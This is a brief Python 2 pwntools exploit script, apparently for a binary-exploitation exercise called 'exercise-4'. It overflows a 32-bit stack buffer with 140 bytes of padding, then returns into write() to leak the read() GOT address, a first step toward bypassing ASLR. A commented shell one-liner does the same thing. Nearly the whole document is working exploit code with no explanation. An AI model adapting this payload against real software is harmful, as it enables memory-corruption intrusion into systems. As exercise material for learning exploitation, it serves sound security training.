from pwn import *
context(arch='i386', os='linux',bits=32) # <-- Add the architecture
binary = ELF("exercise-4")

r=process("./exercise-4")
print r.recvline()
"""
python -c 'print "A"*140 + "\x40\x83\x04\x08" + "RETN" + "\x01\x00\x00\x00" + "\x18\xa0\x04\x08" + "\x08\x00\x00\x00"' | ./exercise-4
"""
exploit = ("A"*140 +  p32(binary.symbols["write"]) + "RETN" + p32(1) + p32(binary.symbols["got.read"]) + p32(8))
#print p32(binary.symbols["write"])
#print [x for x in p32(binary.symbols["write"])]
r.send(exploit)
print r.recv(64)

